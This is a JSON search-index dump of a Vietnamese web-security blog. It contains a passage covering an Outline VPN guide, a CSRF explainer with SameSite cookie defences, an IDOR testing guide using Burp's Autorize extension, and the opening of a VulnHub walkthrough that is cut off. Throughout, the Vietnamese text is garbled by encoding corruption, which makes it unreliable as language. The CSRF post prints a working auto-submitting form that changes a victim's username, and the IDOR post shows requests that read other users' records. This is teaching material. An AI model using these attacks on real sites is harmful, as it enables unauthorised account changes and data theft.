l∆∞·ª£ng m·∫°ng m√† m√¨nh d√πng d∆∞ ra c≈©ng kh√° v·∫•t ƒë·∫•y :v. N√™n s·ª≠ d·ª•ng VPS g·∫ßn m√¨nh, c√†ng g·∫ßn c√†ng t·ªët, n·∫øu kh√¥ng th√¨ ƒë·ªô tr·ªÖ kh√° l·ªõn v√† b·∫°n kh√¥ng vui v·∫ª g√¨ ƒë√¢u. N·∫øu c√≥ th·ªÉ ch·ªçn VPS ·ªü Singapore c√†ng t·ªët, m√¨nh th·∫•y kh√° nhanh v√† ok.   M√¨nh ƒëang th·ª≠ nghi·ªám Outline v·ªõi Raspberry ƒë·ªÉ t·∫°o 1 VPN Server t·∫°i nh√†, n·∫øu c√°c b·∫°n h·ª©ng th√∫ th√¨ upvote ƒë·ªÉ m√¨nh c√≥ ƒë·ªông l·ª±c vi·∫øt th√™m 1 b√†i n·ªØa ƒë·ªÉ t·∫°o 1 VPN Server t·∫°i nh√† s·∫Ω nh∆∞ th·∫ø n√†o nh√© (seeyou).\n ","permalink":"https://minhtuanact.ml/posts/huong-dan-cai-dat-vpn-cho-vps-outline-vpn/","summary":"Gi·ªõi thi·ªáu Ch·∫Øc h·∫≥n m·ªçi ng∆∞·ªùi c≈©ng c√≥ nghe n√≥i qua v·ªÅ VPN r·ªìi. VPN (Virtual Private Network) l√† m·ªôt m·∫°ng ri√™ng ·∫£o, s·ª≠ d·ª•ng internet ƒë·ªÉ k·∫øt n·ªëi 2 ƒë·ªãa ƒëi·ªÉm t·ª´ xa ho·∫∑c ng∆∞·ªùi d√πng v·ªõi m·ªôt m·∫°ng LAN.\nV·∫≠y s·ª≠ d·ª•ng VPN c√≥ m·ª•c ƒë√≠ch g√¨? T√πy theo m·ª•c ƒë√≠ch c·ªßa ng∆∞·ªùi s·ª≠ d·ª•ng VPN, c√≥ th·ªÉ k·∫øt n·ªëi t·ªõi server t·ª´ xa, truy c·∫≠p c√°c trang web b·ªã ch·∫∑n, hay l√† ƒë∆°n gi·∫£n ƒë·∫£m b·∫£o t√≠nh ri√™ng t∆∞ c·ªßa b·∫£n th√¢n khi k·∫øt n·ªëi v·ªõi c√°c m·∫°ng c√¥ng c·ªông.","title":"H∆∞·ªõng d·∫´n c√†i ƒë·∫∑t VPN cho VPS - Outline VPN"},{"content":"Gi·ªõi thi·ªáu m·ªôt ch√∫t v·ªÅ Web Cookies Do HTTP l√† giao th·ª©c kh√¥ng tr·∫°ng th√°i, c√°c request tr∆∞·ªõc v√† sau kh√¥ng h·ªÅ li√™n quan ƒë·∫øn nhau. HTTP kh√¥ng th·ªÉ ph√¢n bi·ªát ng∆∞·ªùi d√πng n√†y v·ªõi ng∆∞·ªùi d√πng kh√°c ƒë∆∞·ª£c. ƒê·ªÉ gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ n√†y, cookie ƒë∆∞·ª£c ra ƒë·ªùi ƒë·ªÉ ph√¢n bi·ªát c√°c ng∆∞·ªùi d√πng v·ªõi nhau. C√°c server s·∫Ω set-cookie cho tr√¨nh duy·ªát l∆∞u l·∫°i, sau ƒë√≥ m·ªói khi g·ª≠i request th√¨ tr√¨nh duy·ªát s·∫Ω th√™m m√£ cookie n√†y r·ªìi g·ª≠i ƒë·∫øn server.\nKhi c√≥ m·ªôt request ƒë∆∞·ª£c g·ª≠i t·ª´ tr√¨nh duy·ªát ƒë·∫øn m·ªôt trang web n√†o ƒë·∫•y, tr√¨nh duy·ªát s·∫Ω ki·ªÉm tra xem gi√° tr·ªã cookie n√†o m√† tr√¨nh duy·ªát l∆∞u l·∫°i thu·ªôc m√°y ch·ªß ƒë√≥ kh√¥ng. Trong khi th·ª±c hi·ªán vi·ªác n√†y, n√≥ s·∫Ω ki·ªÉm tra xem c√°c thu·ªôc t√≠nh, flag c·ªßa cookie (domain, URL, httponly, secure, \u0026hellip;) c√≥ kh·ªõp v·ªõi d·ªØ li·ªáu ƒë√£ l∆∞u trong trang web ƒë√≥ kh√¥ng. N·∫øu ch√∫ng kh·ªõp, tr√¨nh duy·ªát s·∫Ω g·ª≠i c√°c cookie c√≥ li√™n quan c√πng v·ªõi request ƒë√≥.\nV·∫≠y th·∫ø n√†o l√† CSRF (Cross-site Request Forgery) CSRF hay XSRF l√† ki·ªÉu t·∫•n c√¥ng d·ª±a v√†o ch·ª©ng th·ª±c request tr√™n website th√¥ng qua vi·ªác s·ª≠ d·ª•ng cookies. N√≥i cho d·ªÖ hi·ªÉu, khi b·∫°n truy c·∫≠p 1 trang web c·ªßa Attacker, Attacker t·ª± ƒë·ªông t·∫°o 1 request ƒë·∫øn trang target m√† t·∫•t c·∫£ c√°c cookie ƒë∆∞·ª£c l∆∞u trong tr√¨nh duy·ªát c·ªßa ng∆∞·ªùi d√πng v·ªõi trang target s·∫Ω ƒë∆∞·ª£c t·ª± ƒë·ªông th√™m v√†o. N√≥i c√°ch kh√°c, 1 phi√™n l√†m vi·ªác thu·ªôc 1 trang l·∫°i c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng b·ªüi trang kh√°c. ƒê√¢y ch√≠nh l√† m·∫•u ch·ªët c·ªßa vi·ªác t·∫•n c√¥ng CSRF.\nTrong thu·∫≠t ng·ªØ chuy√™n ng√†nh, vi·ªác l·∫°m d·ª•ng tr√¨nh duy·ªát ki·ªÉu n√†y ƒë∆∞·ª£c g·ªçi l√† CSRF (Cross-site Request Forgery). ƒê√≥ l√† m·ªôt l·ªó h·ªïng b·∫£o m·∫≠t web cho ph√©p Attacker khi·∫øn ng∆∞·ªùi d√πng th·ª±c hi·ªán c√°c h√†nh ƒë·ªông m√† h·ªç kh√¥ng c√≥ √Ω ƒë·ªãnh th·ª±c hi·ªán. L·ªói n√†y c√≥ th·ªÉ ƒë∆∞·ª£c Attacker khai th√°c ƒë·ªÉ theo d√µi ng∆∞·ªùi d√πng ho·∫∑c qu·∫£ng c√°o.\nV√≠ d·ª• v·ªÅ CSRF Ch√∫ng ta c√≥ 1 trang web ƒë∆°n gi·∫£n hi·ªÉn th·ªã t√™n username l√† abc.\nB√™n trong trang web n√†y c√≥ 1 ch·ª©c nƒÉng l√† Change Your username d√πng ƒë·ªÉ ƒë·ªïi t√™n username, v√† m√¨nh ƒë√£ s·ª≠ d·ª•ng ch·ª©c nƒÉng n√†y r·ªìi vi·∫øt 1 ƒëo·∫°n m√£ nh∆∞ sau r·ªìi ƒë·∫©y l√™n 1 trang web kh√°c. Khi ng∆∞·ªùi d√πng v√†o trang web c√≥ ch·ª©a ƒëo·∫°n m√£ n√†y th√¨ username c·ªßa trang target kia s·∫Ω b·ªã ƒë·ªïi th√†nh pwned.\n1 2 3 4 5 6 7 8 9 10 11 12  \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt;history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;/\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;form action=\u0026#34;https://x-23.herokuapp.com/hi/settings.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;new\u0026amp;#95;name\u0026#34; value=\u0026#34;pwned\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit request\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   V·∫≠y l√†m th·∫ø n√†o ƒë·ªÉ ngƒÉn ch·∫∑n CSRF  Th√¥ng th∆∞·ªùng b·∫°n c√≥ th·ªÉ tr√°nh theo d√µi nh∆∞ th·∫ø n√†y trong tr√¨nh duy·ªát Firefox v√† Chrome. Tuy nhi√™n, khi ch·∫∑n nh∆∞ v·∫≠y th√¨ ch√∫ng s·∫Ω ngƒÉn vi·ªác g·ª≠i cookie c√πng v·ªõi request c·ªßa b·∫•t k√¨ trang web b√™n th·ª© 3 n√†o. Nh∆∞ v·∫≠y tr·∫£i nghi·ªám duy·ªát web c·ªßa b·∫°n s·∫Ω r·∫•t l√† t·ªá. V√¨ th·∫ø, b·∫±ng c√°ch ch·∫∑n cookie, b·∫°n ho√†n to√†n c√≥ th·ªÉ ch·∫∑n CSRF, nh∆∞ng m√† ƒë·ªïi l·∫°i vi·ªác tr·∫£i nghi·ªám c·ªßa b·∫°n tr√™n internet m√¨nh c√° l√† kh√¥ng vui v·∫ª g√¨ ƒë√¢u.  Same-Site  C√≥ 1 thu·ªôc t√≠nh cookie m·ªõi, Chrome ƒë√£ b·∫Øt ƒë·∫ßu h·ªó tr·ª£ v√†o ng√†y 29 th√°ng 3 v√† theo sau l√† c√°c tr√¨nh duy·ªát ph·ªï bi·∫øn kh√°c. ƒê√≥ ƒë∆∞·ª£c g·ªçi l√† thu·ªôc t√≠nh Cookie Same-Site. C√°c ƒë·ªôi developer c√≥ th·ªÉ ch·ªâ d·∫´n cho tr√¨nh duy·ªát ki·ªÉm so√°t xem cookie c√≥ ƒë∆∞·ª£c g·ª≠i c√πng v·ªõi request c·ªßa trang web b√™n th·ª© 3 t·∫°o ra hay kh√¥ng, b·∫±ng c√°ch s·ª≠ d·ª•ng thu·ªôc t√≠nh cookie Same-Site. ƒê√¢y l√† m·ªôt gi·∫£i ph√°p thi·∫øt th·ª±c h∆°n so v·ªõi vi·ªác t·ª´ ch·ªëi g·ª≠i cookie. ƒê·∫∑t thu·ªôc t√≠nh Same-Site kh√° ƒë∆°n gi·∫£n, n√≥ ch·ªâ c·∫ßn th√™m gi√° tr·ªã SameSite v√†o cookie, v√≠ d·ª•:  1 2  Set-Cookie: CookieName=CookieValue; SameSite=Lax; Set-Cookie: CookieName=CookieValue; SameSite=Strict;    Th·ª≠ set l·∫°i SameSite=Lax r·ªìi th·ª≠ l·∫°i v√≠ d·ª• ph√≠a b√™n tr√™n xem sao\n SameSite ƒë√£ th·ª±c hi·ªán t·ªët vai tr√≤ c·ªßa m√¨nh, n√≥ ƒë√£ ngƒÉn ch·∫∑n ƒë∆∞·ª£c cu·ªôc t·∫•n c√¥ng CSRF. Nh∆∞ng t·∫°i sao l·∫°i c√≥ 2 lo·∫°i SameSite l√† Lax v√† Strict ·ªü ƒë√¢y, n√≥ sinh ra ƒë·ªÉ ngƒÉn ch·∫∑n CSRF th√¥i m√†. V·∫≠y ch√∫ng ta c√≥ th·ªÉ ti·∫øp t·ª•c t√¨m hi·ªÉu so s√°nh 2 lo·∫°i SameSite\nS·ª± kh√°c nhau gi·ªØa Lax v√† Strict SameSite Strict  Nh∆∞ c√°i t√™n ƒë√£ cho th·∫•y r·∫±ng, ƒë√¢y l√† t√πy ch·ªçn trong ƒë√≥ quy ƒë·ªãnh Same-Site ƒë∆∞·ª£c √°p d·ª•ng nghi√™m ng·∫∑t. Khi thu·ªôc t√≠nh SameSite ƒë∆∞·ª£c ƒë·∫∑t l√† Strict, cookie s·∫Ω kh√¥ng ƒë∆∞·ª£c g·ª≠i c√πng v·ªõi c√°c request ƒë∆∞·ª£c b·∫Øt ƒë·∫ßu b·ªüi c√°c trang web c·ªßa b√™n th·ª© 3. ƒê·∫∑t cookie l√† Strict c√≥ th·ªÉ ·∫£nh h∆∞·ªüng ti√™u c·ª±c ƒë·∫øn tr·∫£i nghi·ªám duy·ªát web. V√≠ d·ª•: n·∫øu b·∫°n nh·∫•p v√†o 1 li√™n k·∫øt d·∫´n ƒë·∫øn trang profile c·ªßa Facebook, v√† Facebook.com ƒë·∫∑t cookie c·ªßa n√≥ l√† SameSite=Strict th√¨ b·∫°n kh√¥ng th·ªÉ ti·∫øp t·ª•c redirect tr√™n Facebook tr·ª´ khi b·∫°n ƒëƒÉng nh·∫≠p l·∫°i v√†o Facebook. L√Ω do l√† v√¨ Cookie c·ªßa Facebook kh√¥ng ƒë∆∞·ª£c g·ª≠i k√®m v·ªõi request n√†y.  Lax  Khi b·∫°n ƒë·∫∑t thu·ªôc t√≠nh SameSite c·ªßa cookie th√†nh Lax, cookie s·∫Ω ƒë∆∞·ª£c g·ª≠i c√πng v·ªõi GET request ƒë∆∞·ª£c t·∫°o b·ªüi b√™n th·ª© 3. T·∫°i sao l·∫°i ch·ªâ ch·∫•p nh·∫≠n GET request, th·ª±c ra th√¨ n√≥ ch·∫•p nh·∫≠n c√°c ph∆∞∆°ng th·ª©c request kh√°c nh∆∞ GET, HEAD, OPTIONS, TRACE. V√¨ ƒë√¢y ch√≠nh l√† c√°c ki·ªÉu request ƒë∆∞·ª£c cho l√† \u0026ldquo;An To√†n\u0026rdquo; ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong ph·∫ßn 4.2.1 c·ªßa RFC 7321. Nh∆∞ng ·ªü ƒë√¢y ch√∫ng ta ch·ªâ quan t√¢m ƒë·∫øn GET request m√† th√¥i. V·ªõi v√≠ d·ª• b√™n tr√™n, do ph∆∞∆°ng th·ª©c POST l√† ki·ªÉu HTTP \u0026ldquo;kh√¥ng an to√†n\u0026rdquo; n√™n Cookie k ƒë∆∞·ª£c g·ª≠i khi SameSite=Lax.  C√≥ ph·∫£i ch√∫ng ta s·∫Øp ph·∫£i t·∫°m bi·ªát v·ªõi CSRF  C√≥ v·∫ª nh∆∞ thu·ªôc t√≠nh cookie SameSite l√† m·ªôt bi·ªán ph√°p b·∫£o m·∫≠t hi·ªáu qu·∫£ ch·ªëng l·∫°i c√°c cu·ªôc t·∫•n c√¥ng CSRF. S·ª± ph·ªï bi·∫øn c·ªßa CSRF ƒëang ƒëi xu·ªëng, ch·ª©ng minh cho ƒëi·ªÅu n√†y th√¨ CSRF ƒëang ·ªü v·ªã tr√≠ th·ª© 5 danh s√°ch Top 10 c·ªßa OWASP ƒë∆∞·ª£c c√¥ng b·ªë v√†o nƒÉm 2010, nh∆∞ng n√≥ l·∫°i xu·ªëng v·ªã tr√≠ th·ª© 8 v√†o nƒÉm 2013. V√† b√¢y gi·ªù ch√∫ng ta k th·∫•y n√≥ xu·∫•t hi·ªán trong danh s√°ch Top 10 c·ªßa OWASP n·ªØa. Tr√¨nh duy·ªát ph·ªï bi·∫øn nh·∫•t hi·ªán nay l√† Google Chrome c≈©ng ƒë√£ c√≥ c·∫≠p nh·∫≠t v·ªÅ SameSite   Sept 26, 2019\nStarting in Chrome 80, cookies that do not specify a SameSite attribute will be treated as if they were SameSite=Lax with the additional behavior that they will still be included in POST requests to ease the transition for existing sites. Cookies that still need to be delivered in a cross-site context can explicitly request SameSite=None, and must also be marked Secure and delivered over HTTPS. We will provide policies if you need to configure Chrome Browser to temporarily revert to legacy SameSite behavior.\n  Cookies default to SameSite=Lax\nTreat cookies as SameSite=Lax by default if no SameSite attribute is specified. Developers are still able to opt-in to the status quo of unrestricted use by explicitly asserting SameSite=None.\nThe Stable version of Chrome 80 is targeted for enabling this feature by default. This feature is available as of Chrome 76 by enabling the same-site-by-default-cookies flag. See https://www.chromium.org/updates/same-site for full timeline.\n  B√™n c·∫°nh ƒë√≥ th√¨ Firefox c≈©ng ƒë√£ c√≥ c·∫≠p nh·∫≠t th√™m v·ªÅ Same-Site ·ªü phi√™n b·∫£n FireFox 69.  1 2  network.cookie.sameSite.laxByDefault network.cookie.sameSite.noneRequiresSecure    V·∫≠y ch√∫ng ta c√≥ th·ªÉ hi v·ªçng v√†o 1 ng√†y m√† CSRF s·∫Ω kh√¥ng c√≤n n·ªØa ph·∫£i kh√¥ng n√†o.  Tham kh·∫£o  https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/ https://scotthelme.co.uk/csrf-is-dead/ https://portswigger.net/web-security/csrf/ https://www.chromestatus.com/feature/5088147346030592  ","permalink":"https://minhtuanact.ml/posts/tan-cong-csrf-va-cac-van-de-xung-quanh/","summary":"Gi·ªõi thi·ªáu m·ªôt ch√∫t v·ªÅ Web Cookies Do HTTP l√† giao th·ª©c kh√¥ng tr·∫°ng th√°i, c√°c request tr∆∞·ªõc v√† sau kh√¥ng h·ªÅ li√™n quan ƒë·∫øn nhau. HTTP kh√¥ng th·ªÉ ph√¢n bi·ªát ng∆∞·ªùi d√πng n√†y v·ªõi ng∆∞·ªùi d√πng kh√°c ƒë∆∞·ª£c. ƒê·ªÉ gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ n√†y, cookie ƒë∆∞·ª£c ra ƒë·ªùi ƒë·ªÉ ph√¢n bi·ªát c√°c ng∆∞·ªùi d√πng v·ªõi nhau. C√°c server s·∫Ω set-cookie cho tr√¨nh duy·ªát l∆∞u l·∫°i, sau ƒë√≥ m·ªói khi g·ª≠i request th√¨ tr√¨nh duy·ªát s·∫Ω th√™m m√£ cookie n√†y r·ªìi g·ª≠i ƒë·∫øn server.","title":"T·∫•n c√¥ng CSRF v√† c√°c v·∫•n ƒë·ªÅ xung quanh"},{"content":"Ch·∫Øc h·∫≥n vi·ªác t√¨m l·ªói IDOR lu√¥n l√† c√¥ng vi·ªác th∆∞·ªùng xuy√™n c·ªßa nh·ªØng pentester hay c√°c hunters. Nh∆∞ng m√† l·ªói IDOR ·ªü ƒë√¢y l√† g√¨ nh·ªâ :-?\nWhat is an IDOR vulnerability? V√†o m·ªôt ng√†y ƒë·∫πp tr·ªùi, b·∫°n t·ª± nhi√™n th·∫•y d·ªØ li·ªáu c√° nh√¢n c·ªßa m√¨nh b·ªã thay ƒë·ªïi. B·∫°n nghi ng·ªù qu·∫£n tr·ªã vi√™n n√†o ƒë√£ ch·ªçc ngo√°y v√†o d·ªØ li·ªáu c√° nh√¢n c·ªßa m√¨nh. Hay l√† 1 hacker n√†o ƒë·∫•y ƒëang th·ª≠ ch·ª©c nƒÉng =)). R·∫•t c√≥ th·ªÉ website ƒë√≥ ƒë√£ d√≠nh l·ªói IDOR. V·∫≠y l·ªói IDOR l√† g√¨ v√† n√≥ ho·∫°t ƒë·ªông nh∆∞ th·∫ø n√†o.\nIDOR (INSECURE DIRECT OBJECT REFERENCE) l√† m·ªôt l·ªó h·ªïng b·∫£o m·∫≠t m√† trong ƒë√≥ ng∆∞·ªùi d√πng c√≥ th·ªÉ truy c·∫≠p v√† thay ƒë·ªïi d·ªØ li·ªáu c·ªßa b·∫•t k·ª≥ ng∆∞·ªùi d√πng n√†o kh√°c c√≥ trong h·ªá th·ªëng. N√≥ ƒë∆∞·ª£c x·∫øp th·ª© 4 trong danh s√°ch OWASP Top 10 l·ªó h·ªïng b·∫£o m·∫≠t web t·ª´ nƒÉm 2013. T·∫•n c√¥ng n√†y c√≥ th·ªÉ x·∫£y ra khi kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø x√°c th·ª±c n√†o cho ph√©p attacker c√≥ th·ªÉ s·ª≠ d·ª•ng c√°c tham chi·∫øu n√†y ƒë·ªÉ ƒë·ªçc, thay ƒë·ªïi hay s·ª≠ d·ª•ng d·ªØ li·ªáu tr√°i ph√©p.\nV√≠ d·ª•: Website c·ªßa b·∫°n c√≥ ch·ª©c nƒÉng xem th√¥ng tin ng∆∞·ªùi d√πng qua ƒë·ªãnh danh ID\nRequest:\n1 2 3  GET /account/123 HTTP 1.1 Host: example.com Cookie: ...   Response:\n1  {id: 123, username: MinhTuan, Address: 13F Keangnam, ... }   ƒê√¢y l√† nh·ªØng d·ªØ li·ªáu c√° nh√¢n m√† th√¥ng th∆∞·ªùng ch·ªâ c√≥ t√†i kho·∫£n c·ªßa ng∆∞·ªùi d√πng ƒë√≥ m·ªõi c√≥ th·ªÉ xem ƒë∆∞·ª£c. Nh∆∞ng Attacker c√≥ th·ªÉ thay ƒë·ªïi gi√° tr·ªã id ƒë·ªÉ c√≥ th·ªÉ xem ƒë∆∞·ª£c th√¥ng tin c·ªßa ng∆∞·ªùi d√πng kh√°c.\n1 2  GET /account/124 HTTP 1.1 Host: example.com   Response:\n1  {id: 124, username: Nghia, Address: Trieu Khuc, ... }   Hay c·∫£ ƒë·ªëi v·ªõi ch·ª©c nƒÉng th√™m, s·ª≠a, x√≥a th√¥ng tin m√† ng∆∞·ªùi d√πng n√†y c√≥ th·ªÉ th·ª±c hi·ªán ƒë∆∞·ª£c ƒë·ªëi v·ªõi t√†i kho·∫£n ng∆∞·ªùi d√πng kh√°c th√¨ c≈©ng g·ªçi l√† l·ªói IDOR.\nHow to test IDOR vulnerability ƒê·ªÉ ki·ªÉm tra l·ªói IDOR tr√™n 1 website, ta s·ª≠ d·ª•ng 2 t√†i kho·∫£n kh√°c nhau, ƒëƒÉng nh·∫≠p 2 t√†i kho·∫£n tr√™n 2 tr√¨nh duy·ªát kh√°c nhau. R·ªìi s·ª≠ d·ª•ng c√°c ch·ª©c nƒÉng c·ªßa t√†i kho·∫£n n√†y, th·ª≠ thay ƒë·ªïi c√°c param truy·ªÅn v√†o nh∆∞ng l·∫°i ·ª©ng v·ªõi t√†i kho·∫£n kia xem c√≥ ƒë∆∞·ª£c kh√¥ng.\nTh√¥ng th∆∞·ªùng ƒë·ªëi v·ªõi m√¨nh th√¨ m√¨nh b·∫Øt c√°c request c·ªßa 1 t√†i kho·∫£n qua BurpSuite, sau ƒë√≥ chuy·ªÉn request ƒë√≥ sang tab Repeater. Th·ª≠ thay ƒë·ªïi c√°c gi√° tr·ªã truy·ªÅn v√†o, c√°c param tr√™n URL ·ª©ng v·ªõi t√†i kho·∫£n th·ª© 2 kia. Ki·ªÉm tra response tr·∫£ v·ªÅ v√† sang t√†i kho·∫£n 2 ki·ªÉm tra xem c√≥ d·ªØ li·ªáu n√†o b·ªã thay ƒë·ªïi hay kh√¥ng. C√¥ng vi·ªác n√†y kh√° m·∫•t th·ªùi gian. N·∫øu 1 website m√† c√≥ nhi·ªÅu ch·ª©c nƒÉng th√¨ ƒë·ªëi v·ªõi 1 pentester ph·∫£i test h·∫øt to√†n b·ªô ƒë·ªÉ tr√°nh \u0026ldquo;l·ªçt l∆∞·ªõi\u0026rdquo; =)).\nƒê·ªÉ gi·∫£m thi·ªÉu th·ªùi gian test IDOR, m√¨nh c·∫ßn c√°c c√¥ng c·ª• ƒë·ªÉ c√≥ th·ªÉ test nhanh h∆°n, ƒë·ª° m·∫•t th·ªùi gian v√†o vi·ªác n√†y h∆°n. G·∫ßn ƒë√¢y m√¨nh c≈©ng ƒëang s·ª≠ d·ª•ng 1 v√†i extension c·ªßa Burp kh√° hay ƒë·ªÉ test l·ªói IDOR.\nAutorize B·∫°n c√≥ th·ªÉ c√†i ƒë·∫∑t Autorize t·ª´ BApp Store trong Burp. ƒê·ªÉ bi·∫øt th√™m v·ªÅ c√°c option kh√°c trong extension n√†y, b·∫°n c√≥ th·ªÉ v√†o trang ch·ªß c·∫≠p nh·∫≠t th√™m Autorize\nAutomation - ƒê·ªëi v·ªõi m·ªói Request b·∫°n th·ª±c hi·ªán, extension n√†y s·∫Ω th·ª±c hi·ªán th√™m 2 request n·ªØa, 1 l√† c√≥ s·ª≠ d·ª•ng Cookie c·ªßa t√†i kho·∫£n th·ª© 2 m√† b·∫°n config, 2 l√† request kh√¥ng s·ª≠ d·ª•ng Cookie, t·ª©c l√† ng∆∞·ªùi d√πng ch∆∞a th·ª±c hi·ªán ƒëƒÉng nh·∫≠p.\nTa c√≥ th·ªÉ s·ª≠ d·ª•ng 2 t√†i kho·∫£n: Ng∆∞·ªùi d√πng A: Qu·∫£n tr·ªã vi√™n Ng∆∞·ªùi d√πng B: Ng∆∞·ªùi d√πng b√¨nh th∆∞·ªùng\nDuy·ªát ·ª©ng d·ª•ng web v·ªõi ng∆∞·ªùi d√πng A v√† th√™m cookie c·ªßa ng∆∞·ªùi d√πng B trong ch·∫ø ƒë·ªô t·ª± ƒë·ªông c·ªßa Autorize.  Autorize update th√™m t√≠nh nƒÉng Fetch Authorization header, c√°c b·∫°n c√≥ th·ªÉ ki·ªÉm tra xem website c·ªßa m√¨nh ƒëang s·ª≠ d·ª•ng lo·∫°i x√°c th·ª±c n√†o m√† c√≥ th·ªÉ s·ª≠ d·ª•ng ch·ª©c nƒÉng t∆∞∆°ng ·ª©ng nh√©  Ch√∫ng ta c√≥ th·ªÉ th√™m b·ªô filter ƒë·ªÉ m√¨nh c√≥ th·ªÉ nh·∫≠n ƒë∆∞·ª£c c√°c k·∫øt qu·∫£ mong mu·ªën, tr√°nh c√°c k·∫øt qu·∫£ r√°c v√† ·∫£nh h∆∞·ªüng ƒë·∫øn th√¥ng tin m√¨nh nh·∫≠n ƒë∆∞·ª£c.\nNh·∫•p v√†o n√∫t Autorize in on ƒë·ªÉ extension ho·∫°t ƒë·ªông, v√† b·∫Øt ƒë·∫ßu duy·ªát web b√¨nh th∆∞·ªùng v·ªõi t∆∞ c√°ch qu·∫£n tr·ªã vi√™n (ng∆∞·ªùi d√πng A).\nNh∆∞ h√¨nh tr√™n, b·∫°n c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c ƒë·ªô d√†i c·ªßa response tr·∫£ v·ªÅ c·ªßa ng∆∞·ªùi d√πng A v√† ng∆∞·ªùi d√πng B l√† b·∫±ng nhau. R·∫•t c√≥ th·ªÉ ·ªü ƒë√¢y d√≠nh l·ªói IDOR, b·∫°n n√™n ki·ªÉm tra l·∫°i 1 l·∫ßn n·ªØa cho ch·∫Øc. C√≤n n·∫øu m√£ l·ªói tr·∫£ v·ªÅ c·ªßa ng∆∞·ªùi d√πng B l√† 403 th√¨ l·ªói v·ªÅ IDOR l√† kh√¥ng c√≥.\n Ch·ªâ c·∫ßn duy·ªát website v√† th·ª≠ c√°c ch·ª©c nƒÉng ƒë·∫∑c quy·ªÅn c·ªßa qu·∫£n tr·ªã vi√™n v√† ng∆∞·ªùi d√πng th√¥ng th∆∞·ªùng. N·∫øu request c·ªßa ng∆∞·ªùi d√πng th√¥ng th∆∞·ªùng m√† tr·∫£ v·ªÅ 200 ·ª©ng v·ªõi ch·ª©c nƒÉng c·ªßa qu·∫£n tr·ªã vi√™n th√¨ b·∫°n c·∫ßn ph·∫£i ki·ªÉm tra l·∫°i ngay. R·∫•t c√≥ th·ªÉ ƒë·∫•y ch√≠nh l√† l·ªói IDOR. T∆∞∆°ng t·ª± ƒë·ªëi v·ªõi c√°c ch·ª©c nƒÉng c·ªßa ng∆∞·ªùi d√πng th√¥ng th∆∞·ªùng v·ªõi nhau. Xem r·∫±ng ng∆∞·ªùi n√†y c√≥ th·ªÉ c·∫≠p nh·∫≠t hay x√≥a th√¥ng tin c·ªßa ng∆∞·ªùi kia ƒëi hay kh√¥ng.\n  R·∫•t nhi·ªÅu t√≠nh nƒÉng kh√°c ƒëang ch·ªù b·∫°n kh√°m ph√° v·ªõi extension n√†y. Vi·ªác s·ª≠ d·ª•ng n√≥ gi√∫p m√¨nh ƒë·ª° r·∫•t nhi·ªÅu th·ªùi gian v√† c√¥ng s·ª©c khi ki·ªÉm tra c√°c l·ªói IDOR, v√† n√≥ c√≥ th·ªÉ bao qu√°t h·∫øt c√°c kh·∫£ nƒÉng m√† m√¨nh c√≥ th·ªÉ b·ªè qua.\n Reference  https://medium.com/cyberverse/automating-burp-to-find-idors-2b3dbe9fa0b8 https://blog.detectify.com/2016/05/25/owasp-top-10-insecure-direct-object-reference-4/ https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/  ","permalink":"https://minhtuanact.ml/posts/tim-kiem-cac-loi-idor-chua-bao-gio-lai-de-den-the-voi-extension-autorize/","summary":"Ch·∫Øc h·∫≥n vi·ªác t√¨m l·ªói IDOR lu√¥n l√† c√¥ng vi·ªác th∆∞·ªùng xuy√™n c·ªßa nh·ªØng pentester hay c√°c hunters. Nh∆∞ng m√† l·ªói IDOR ·ªü ƒë√¢y l√† g√¨ nh·ªâ :-?\nWhat is an IDOR vulnerability? V√†o m·ªôt ng√†y ƒë·∫πp tr·ªùi, b·∫°n t·ª± nhi√™n th·∫•y d·ªØ li·ªáu c√° nh√¢n c·ªßa m√¨nh b·ªã thay ƒë·ªïi. B·∫°n nghi ng·ªù qu·∫£n tr·ªã vi√™n n√†o ƒë√£ ch·ªçc ngo√°y v√†o d·ªØ li·ªáu c√° nh√¢n c·ªßa m√¨nh. Hay l√† 1 hacker n√†o ƒë·∫•y ƒëang th·ª≠ ch·ª©c nƒÉng =)).","title":"T√¨m ki·∫øm c√°c l·ªói IDOR, ch∆∞a bao gi·ªù l·∫°i d·ªÖ ƒë·∫øn th·∫ø v·ªõi extension Autorize"},{"content":"Gi·ªõi thi·ªáu H√¥m nay tr·ªùi kh√° l√† l·∫°nh, h√¨nh nh∆∞ l√† l·∫°nh nh·∫•t t·ª´ l√∫c m√πa ƒë√¥ng gh√© qua th·ªß ƒë√¥ H√† N·ªôi. S√°ng qu·∫•n chƒÉn ƒë·∫øn 7h s√°ng m·ªõi d·∫≠y. D·∫≠y ch∆°i v√†i t·ª±a game 8-bit ng√†y x∆∞a kh√° l√† k·ª∑ ni·ªám. L√¢u r·ªìi c≈©ng kh√¥ng build b√†i lab n√†o l√™n l√†m th·ª≠. Th·ª≠ t·∫£i 1 b√†i v·ªÅ ch∆°i xem sao. L·∫ßn n√†y v·∫´n l√† b√†i tr√™n https://www.vulnhub.com/. Ch·ªçn ng·∫´u nhi√™n 1 b√†i th·ª≠ xem tr√¨nh ƒë·ªô m√¨nh ƒë·∫øn ƒë√¢u :joy::joy::joy:\nL·∫ßn n√†y s·∫Ω l√† 1 b√†i ƒë·∫øn t·ª´ Hacking Aricles c√≥ t√™n l√† HA: DHANUSH , m·ª©c ƒë·ªô c≈©ng l√† v·ª´a ph·∫£i.\nTh√¥i kh√¥ng linh tinh luy√™n thuy√™n n·ªØa, v√†o v·∫•n ƒë·ªÅ ch√≠nh 